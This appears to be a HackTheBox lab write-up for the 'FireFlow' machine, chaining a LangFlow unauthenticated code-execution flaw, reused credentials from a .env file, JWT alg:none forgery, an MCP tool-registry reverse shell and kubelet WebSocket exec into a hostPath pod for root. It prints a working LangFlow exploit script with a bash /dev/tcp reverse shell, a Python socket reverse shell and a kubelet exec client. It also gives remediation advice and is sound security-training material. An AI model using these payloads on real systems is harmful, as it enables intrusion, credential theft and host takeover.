# 🎯 HackTheBox — FireFlow

[![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?style=flat-square)](https://www.hackthebox.com/)
[![OS](https://img.shields.io/badge/OS-Linux-blue?style=flat-square&logo=linux)](https://www.linux.org/)
[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)]()
[![Status](https://img.shields.io/badge/Status-Pwned-success?style=flat-square)]()

**Difficulty:** Medium · **OS:** Linux · **Category:** Web / Cloud / Container Escape

| Status | Platform | OS | Difficulty |
|:------:|:--------:|:--:|:----------:|
| ✅ Pwned | HackTheBox | Linux | Medium |

> By [@timgad794](https://github.com/timgad794)

---

## 📋 Exploit Chain
```
Recon (nmap) → LangFlow unauth RCE → www-data shell
  → .env credential leak → SSH as nightfall → User flag
  → MCP config → JWT alg:none forgery → MCP tool RCE → mcp pod shell
  → K8s RBAC (nodes/proxy) → Kubelet WebSocket exec
  → privileged hostPath pod → Root flag
```

---

## 🔧 Step 1 — Reconnaissance

### 1.1 Hosts entry

```bash
echo "10.129.153.242 fireflow.htb flow.fireflow.htb" | sudo tee -a /etc/hosts
```

### 1.2 Full Nmap port scan

```bash
mkdir -p ~/fireflow && cd ~/fireflow
nmap -p- --min-rate 5000 -T4 -oN nmap_all.txt fireflow.htb
```

**Result:**

| Port | State | Service |
|:----:|:-----:|:-------:|
| 22/tcp | open | ssh |
| 443/tcp | open | https |

### 1.3 Service detection

```bash
nmap -p 22,443 -sCV -oN nmap_detail.txt fireflow.htb
```

| Port | Service | Version |
|:----:|:-------:|:--------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 |
| 443/tcp | HTTPS | nginx (cert `*.fireflow.htb`) |

### 1.4 Subdomain discovery

```bash
curl -sk https://fireflow.htb/ | grep -oE 'playground/[0-9a-f-]+'
```

```
playground/<FLOW_ID>
```

The landing page links to a public **LangFlow** playground on `flow.fireflow.htb`.

---

## 🔧 Step 2 — LangFlow Unauthenticated RCE

### 2.1 Vulnerability overview

| Property | Value |
|:---------|:------|
| **Endpoint** | `POST /api/v1/build_public_tmp/{flow_id}/flow` |
| **Auth** | None required |
| **Impact** | Remote Code Execution as `www-data` |
| **Root cause** | The optional `data` parameter overrides the stored flow definition. The `code` field of any node template is executed via `exec()` without sandboxing. |

Two important pitfalls:

- The payload must sit at **module level** — the loader calls `prepare_global_scope()`, which evaluates the entire module body.
- The outer JSON must contain a `data.nodes` array and an `inputs: null` field.

### 2.2 Exploit script

```python
import requests, uuid, urllib3
urllib3.disable_warnings()

TARGET  = "https://flow.fireflow.htb"
FLOW_ID = "<FLOW_ID>"
LHOST   = "<VPN_IP>"
LPORT   = 4444

shell_cmd = "bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'" % (LHOST, LPORT)

code_value = (
    "import os\n\n"
    "_x = os.system(\"%s\")\n\n"
    "from lfx.custom.custom_component.component import Component\n"
    "from lfx.io import Output\n"
    "from lfx.schema.data import Data\n\n"
    "class ExploitComp(Component):\n"
    "    display_name=\"X\"\n"
    "    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n"
    "    def r(self)->Data:\n"
    "        return Data(data={})"
) % shell_cmd

data = {
    "data": {
        "nodes": [{
            "id": "Exploit-001",
            "type": "genericNode",
            "position": {"x": 0, "y": 0},
            "data": {
                "id": "Exploit-001",
                "type": "ExploitComp",
                "node": {
                    "template": {
                        "code": {
                            "type": "code", "required": True, "show": True,
                            "multiline": True, "value": code_value,
                            "name": "code", "password": False,
                            "advanced": False, "dynamic": False
                        },
                        "_type": "Component"
                    },
                    "description": "X",
                    "base_classes": ["Data"],
                    "display_name": "ExploitComp",
                    "name": "ExploitComp",
                    "frozen": False,
                    "outputs": [{
                        "types": ["Data"], "selected": "Data",
                        "name": "o", "display_name": "O",
                        "method": "r", "value": "__UNDEFINED__",
                        "cache": True, "allows_loop": False,
                        "tool_mode": False, "hidden": None,
                        "required_inputs": None, "group_outputs": False
                    }],
                    "field_order": ["code"],
                    "beta": False, "edited": False
                }
            }
        }],
        "edges": []
    },
    "inputs": None
}

url = TARGET + "/api/v1/build_public_tmp/" + FLOW_ID + "/flow"
try:
    r = requests.post(url, json=data,
        cookies={"client_id": str(uuid.uuid4())},
        verify=False, timeout=30)
    print("Status:", r.status_code)
except requests.exceptions.ReadTimeout:
    print("[+] Shell active")
```

### 2.3 Execution

```bash
# Terminal A
rlwrap nc -lvnp 4444

# Terminal B
python3 exploit.py
```

**Result:** shell as `www-data@fireflow:/var/lib/langflow$`

---

## 🔧 Step 3 — Credential Leak → SSH as nightfall

```bash
cat /etc/langflow/.env
```

Relevant values:

```ini
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=<PASSWORD>
LANGFLOW_SECRET_KEY=<SECRET>
```

The same password works for the local system user `nightfall`:

```bash
ssh nightfall@fireflow.htb
```

```bash
cat ~/user.txt
# → 🟢 user flag
```

---

## 🔧 Step 4 — MCP Server Enumeration

```bash
cat ~/.mcp/config.json
```

```json
{
  "server": "http://fireflow.htb:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "<MCP_PASSWORD>"
}
```

### 4.1 Endpoint discovery

```bash
curl -s http://fireflow.htb:30080/openapi.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
for p,m in d['paths'].items():
    for meth in m: print(meth.upper(), p)
"
```

| Method | Path | Auth |
|:------:|:-----|:----:|
| GET  | `/api/v1/version` | open |
| POST | `/api/v1/auth` | open |
| GET  | `/api/v1/tools` | auth |
| POST | `/api/v1/tools` | **admin** |
| POST | `/mcp` | auth |

---

## 🔧 Step 5 — JWT alg:none Forgery

### 5.1 Get a legitimate token

```bash
curl -s -X POST http://fireflow.htb:30080/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"langflow-bot","password":"<MCP_PASSWORD>"}'
```

The decoded payload contains `"role":"user"`.

### 5.2 Vulnerability

The server explicitly accepts `alg:none` and skips signature verification:

```python
if alg == "none":
    payload = jose_jwt.decode(token, key="", options={"verify_signature": False})
```

**Impact:** Any unsigned JWT is trusted. The `role` claim can be set to `admin`.

### 5.3 Forge the token

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "attacker", "role": "admin"}).encode())
print(f"{header}.{payload}.")
```

```bash
FAKE=$(python3 fake_jwt.py)
```

---

## 🔧 Step 6 — RCE via MCP Tool Registry

### 6.1 Register a reverse-shell tool

```bash
curl -s -X POST http://fireflow.htb:30080/api/v1/tools \
  -H "Authorization: Bearer $FAKE" \
  -H "Content-Type: application/json" \
  -d '{"name":"rev","description":"x","code":"import socket,subprocess,os;s=socket.socket();s.connect((\"<VPN_IP>\",5555));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])"}'
```

### 6.2 Trigger it

```bash
curl -s -X POST http://fireflow.htb:30080/mcp \
  -H "Authorization: Bearer $FAKE" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"rev","arguments":{}}}'
```

**Result:** shell as `mcp` inside a Kubernetes pod.

---

## 🔧 Step 7 — Kubernetes Enumeration

### 7.1 Service account token

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

### 7.2 Check permissions

```bash
curl -sk -X POST https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

**Critical permission found:**

```json
{ "verbs": ["get"], "apiGroups": [""], "resources": ["nodes/proxy"] }
```

### 7.3 List pods via kubelet proxy

```bash
NODE=fireflow
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://10.43.0.1:443/api/v1/nodes/$NODE/proxy/pods"
```

**Target:** `monitoring/prometheus-prometheus-node-exporter-nmntq`

| Container | hostPath mounts |
|:----------|:----------------|
| `node-exporter` | `/proc`, `/sys`, `/` |

---

## 🔧 Step 8 — Kubelet WebSocket Exec → Root

### 8.1 Concept

RBAC only grants `get` on `nodes/proxy` (no `create` on `pods/exec`). However, the **kubelet** on port **10250** only validates the service account token — it does not enforce RBAC. This allows direct exec into the privileged pod via WebSocket.

### 8.2 Minimal Python WebSocket client

```python
import socket, ssl, base64, os, sys, struct

HOST="fireflow"; PORT=10250
NAMESPACE="monitoring"
POD="prometheus-prometheus-node-exporter-nmntq"
CONT="node-exporter"

cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
query = "output=1&error=1&" + "&".join("command=" + w for w in cmd.split())
path = f"/exec/{NAMESPACE}/{POD}/{CONT}?{query}"

TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
key = base64.b64encode(os.urandom(16)).decode()

req = (f"GET {path} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nUpgrade: websocket\r\n"
       f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
       f"Sec-WebSocket-Version: 13\r\nSec-WebSocket-Protocol: v4.channel.k8s.io\r\n"
       f"Authorization: Bearer {TOKEN}\r\n\r\n")

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
s = ctx.wrap_socket(socket.create_connection((HOST,PORT), timeout=15), server_hostname=HOST)
s.sendall(req.encode())

buf=b""
while b"\r\n\r\n" not in buf: buf += s.recv(4096)
_,_,rest = buf.partition(b"\r\n\r\n")
leftover = rest

while True:
    try:
        data = leftover if leftover else b""
        while len(data) < 2:
            c = s.recv(4096)
            if not c: sys.exit(0)
            data += c
        b1,b2 = data[0],data[1]; op=b1&0x0f; ln=b2&0x7f; off=2
        if ln==126:
            while len(data)<4: data+=s.recv(4096)
            ln=struct.unpack(">H",data[2:4])[0]; off=4
        elif ln==127:
            while len(data)<10: data+=s.recv(4096)
            ln=struct.unpack(">Q",data[2:10])[0]; off=10
        while len(data)<off+ln: data+=s.recv(4096)
        payload=data[off:off+ln]; leftover=data[off+ln:]
        if op==0x8: break
        if op in (0x1,0x2) and payload:
            sys.stdout.write(payload[1:].decode(errors="replace")); sys.stdout.flush()
    except Exception as e:
        print("\n[ERR]", e); break

s.close()
```

### 8.3 Verify

```bash
python3 x.py "id"
# uid=0(root) gid=65534(nobody)
```

### 8.4 Read the root flag

```bash
python3 x.py "cat /proc/1/root/root/root.txt"
# → 🔴 root flag
```

---

## 🏆 Result

| Flag | Path | Status |
|:----:|:-----|:------:|
| 🟢 User | `/home/nightfall/user.txt` | ✅ obtained |
| 🔴 Root | `/proc/1/root/root/root.txt` (via hostPath) | ✅ obtained |

---

## 📚 Core Concepts

| Concept | Application in FireFlow |
|:--------|:------------------------|
| LangFlow unauth RCE | `build_public_tmp` executes component code unsandboxed |
| Module-level payload | Payload must run at module scope, not inside a method |
| Credential hygiene | Plaintext `.env` used by the application process |
| JWT `alg:none` | Server whitelists `none` → unsigned forgery accepted |
| MCP tool registry | Tool code runs when invoked via `/mcp` JSON-RPC |
| K8s RBAC review | `SelfSubjectRulesReview` reveals `nodes/proxy` |
| Kubelet auth model | Port 10250 validates token but ignores RBAC |
| WebSocket subprotocol | `v4.channel.k8s.io` for exec streams |
| Container escape | `hostPath: /` + `/proc/1/root/` = host filesystem |
| Least privilege | Pod SA had `nodes/proxy` — should be removed |

---

## 🧰 Tools & References

| Tool | Purpose |
|:-----|:--------|
| [Nmap](https://nmap.org/) | Port & service enumeration |
| [LangFlow 1.8.2](https://github.com/langflow-ai/langflow) | Target application |
| [Python 3](https://www.python.org/) | Exploit scripting (`requests`, `socket`, `ssl`) |
| [jq](https://stedolan.github.io/jq/) | JSON parsing |
| [rlwrap](https://github.com/hanslub42/rlwrap) | Better reverse-shell handling |
| [screen](https://www.gnu.org/software/screen/) | Persistent terminal sessions |

**Further reading:**

- [Kubernetes SelfSubjectRulesReview API](https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/self-subject-rules-review-v1/)
- [Kubelet server reference](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go)
- [JWT alg:none vulnerability](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)

---

## 🛠️ Remediation

| Weakness | Recommendation |
|:---------|:---------------|
| LangFlow unauth RCE via `build_public_tmp` | Update to a patched version; disable public flow execution |
| Plaintext credentials in `.env` | Use a secrets manager; restrict file permissions |
| JWT `alg:none` accepted | Enforce an algorithm whitelist on the server (HS256/RS256 only) |
| MCP tool code runs unsandboxed | Sandbox tool execution; audit tool registration |
| `nodes/proxy` in RBAC | Apply least-privilege; remove if not required |
| `hostPath: /` in pod | Enforce Pod Security Standards; block `hostPath` mounts of `/`, `/proc`, `/sys` |

---

## ⚠️ Disclaimer

This writeup documents an authorized penetration test on the **HackTheBox** platform only. All credentials and flags are part of the training environment and are **not** production data.

---

⭐ If this writeup helps you, feel free to leave a star!
